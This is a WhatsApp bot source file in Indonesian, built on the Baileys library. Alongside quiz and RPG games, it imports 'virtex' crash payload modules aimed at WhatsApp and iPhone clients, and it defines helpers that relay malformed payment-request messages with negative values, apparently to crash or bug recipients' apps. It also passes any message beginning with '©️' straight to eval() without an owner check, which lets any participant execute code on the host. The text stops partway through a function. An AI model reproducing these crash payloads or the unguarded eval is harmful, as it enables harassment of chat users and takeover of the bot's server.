require('./kespler')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const mathjs = require('mathjs')
const chalk = require('chalk')
const { JSDOM } = require('jsdom')
const os = require('os')
const path = require('path')
const cl = require('caliph-api') 
const mel = require('kitsune-api')
const axios = require('axios')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const maker = require('mumaker')
const textpro = require('./casper-file/lib/textpro')
const speed = require('performance-now')
const { apikey } = require('./config.json')
const { performance } = require('perf_hooks')
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./casper-file/virtex/virtex.js')
const { ngazap } = require('./casper-file/virtex/ngazap')
const { buttonvirus } = require('./casper-file/virtex/buttonvirus')
const { buttonkal } = require('./casper-file/virtex/buttonkal')
const { bugsw } = require('./casper-file/virtex/bugsw')
const { iphone } = require('./casper-file/virtex/iphone')
const { iphone1 } = require('./casper-file/virtex/iphone1')
const { iphone2 } = require('./casper-file/virtex/iphone2')
const { iphone3 } = require('./casper-file/virtex/iphone3')
const { iphone4 } = require('./casper-file/virtex/iphone4')
const { iphone5 } = require('./casper-file/virtex/iphone5')
const { iphone6 } = require('./casper-file/virtex/iphone6')
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser } = require('./casper-file/lib/register')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./casper-file/lib/myfunc')
//=================================================//
// CMD FUNC
const { menu } = require('./casper-file/command/menu/menu')
const { bugmenu } = require('./casper-file/command/bugmenu/bugmenu')
const { allmenu } = require('./casper-file/command/allmenu/allmenu')
const { textmaker } = require('./casper-file/command/textmaker/textmaker')
const { game } = require('./casper-file/command/game/game')
const { mediafireDl } = require('./casper-file/lib/mediafire.js')
const thumbnail = fs.readFileSync ('./casper-file/image/mamak.jpg')
const ntilink = JSON.parse(fs.readFileSync("./casper-file/lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./casper-file/dbnye/banned.json'))
virgam = fs.readFileSync(`./casper-file/image/deden.jpeg`)
//=================================================//
//RPG FUNC
const { 
addInventoriDarah,cekDuluJoinAdaApaKagaDiJson,addDarah,kurangDarah, getDarah 
}= require('./src/darah.js')
const { 
cekInventoryAdaAtauGak,addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion
} = require('./src/alat_tukar.js')
const {addInventoriMonay,cekDuluJoinAdaApaKagaMonaynyaDiJson,addMonay,kurangMonay, getMonay 
} = require('./src/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit 
} = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,addKelinci,addDomba,addSapi, addGajah, kurangIkan, kurangAyam,kurangKelinci,kurangDomba,kurangSapi, kurangGajah, getIkan, getAyam,getKelinci,getDomba,getSapi, getGajah
} = require('./src/buruan.js')
let DarahAwal =global.rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const ikan = ['🐟','🐠','🐡']
//=================================================//
//RPG DATABASE
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
//=================================================//
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = kesper = async (kesper, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = kesper.user.id ? kesper.user.id.split(":")[0]+"@s.whatsapp.net" : kesper.user.id
const isCreator = [kesper.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const isBan = banned.includes(m.sender)
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await kesper.groupMetadata(m.chat).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const content = JSON.stringify(m.message)
const _registered = JSON.parse(fs.readFileSync('./casper-file/dbnye/registered.json'));
const register = JSON.parse(fs.readFileSync('./casper-file/dbnye/register.json'));
const isRegistered = checkRegisteredUser(m.sender)
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

//=================================================//
const deploy = (teks) => {
  kesper.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'BTC', requestFrom: '0@s.whatsapp.net', expiryTimestamp: -3330, amount: -500, contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',background: thumb }}}}}}, { quoted:exe})}

const begobug = (teks) => {
  kesper.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'BTC', requestFrom: '', expiryTimestamp: -3330, amount: -500, contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',background: thumb }}}}}}, { quoted:exe})}
//=================================================//
const reply = (teks) => {
return kesper.sendMessage(m.chat, { image: casthumb,
caption: teks,
footer: `Selamat ${salam}`,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})}

const bugb = (teks) => {
return kesper.sendMessage(m.chat, { text: teks,
templateButtons: [
{ callButton: { displayText: `OWNER`, phoneNumber: `62882003133773`}},
{ callButton: { displayText: `OWNER`, phoneNumber: `62882003133773`}},
{ callButton: { displayText: `OWNER`, phoneNumber: `62882003133773`}},
{ urlButton: { displayText: `GROUP`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
{ urlButton: { displayText: `GROUP`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
{ urlButton: { displayText: `GROUP`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
{ quickReplyButton: { displayText: `CASPER`, id: `JAGOAN OM?`}},
]
}, { quoted:exe})
}
//=================================================//
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//=================================================//
if (!kesper.public) {
if (!m.key.fromMe) return
}
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
const casthumb = fs.readFileSync ('./casper-file/file/thumb.jpg')
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./casper-file/stickernye/wait.webp')
kesper.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./casper-file/stickernye/BotAdman.webp')
kesper.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./casper-file/stickernye/owner.webp')
kesper.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./casper-file/stickernye/SuksesCok.webp')
kesper.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./casper-file/stickernye/BanLu.webp')
kesper.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./casper-file/stickernye/groupon.webp')
kesper.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./casper-file/stickernye/SiGroupadmin.webp')
kesper.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
const ese = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
'contactMessage': { 'displayName': `${ngazap(prefix)}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${kesper.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
}}}

const exe = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
'contactMessage': { 'displayName': `Message From ${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${kesper.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
}}}
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await kesper.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`「 Detect Link 」\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `「 Detect Link 」\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await kesper.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
kesper.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: kesper.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, kesper.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
kesper.ev.emit('messages.upsert', msg)
}
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            kesper.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaklagu[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await reply(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakgambar[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakkata[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakkalimat[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaklirik[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaktebakan[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await kesper.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await kesper.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    kesper.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    kesper.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) kesper.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) kesper.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) kesper.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    kesper.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) kesper.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) kesper.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    kesper.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await kesper.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
async function replyReg(teks) {
const templateButtonoos = [
{index: 1, urlButton: {displayText: 'Groups Bot', url: linkgrupss}}
]
const templateMessaggge = {
video:fs.readFileSync("./casper-file/video/kesper.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`Haii 👋 Kak ${pushname} Selamat ${salam} Ini Adalah Bot Khusus Group
Agar Bot Bisa Di Gunakan Silahkan Meminta Pasword Kepada Owner Terlebih Dahulu Agar Bisa Menggunakan Bot Casper'
 `,
footer: '© Casper',
templateButtons: templateButtonoos
}
kesper.sendMessage(m.chat, templateMessaggge)
}
async function sendButRegis(from) {
var serialUser = createSerial(18)
_registered.push(sender)
fs.writeFileSync('./casper-file/dbnye/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const templateButtonoos = [
{index: 1, urlButton: {displayText: 'Groups Bot', url: linkgrupss}}
]
const templateMessaggge = {
video:fs.readFileSync("./casper-file/video/kesper.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `
Haii 👋 Kak ${pushname} Selamat ${salam} 

🌷 Nama : ${pushname}
🌷 Status : Verifikasi
🌷 Total User : ${_registered.length}

*Silahkan Ketik Menu Untuk Menggunakan Bot`,
footer: '© Casper',
templateButtons: templateButtonoos
}
kesper.sendMessage(m.chat, templateMessaggge)
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
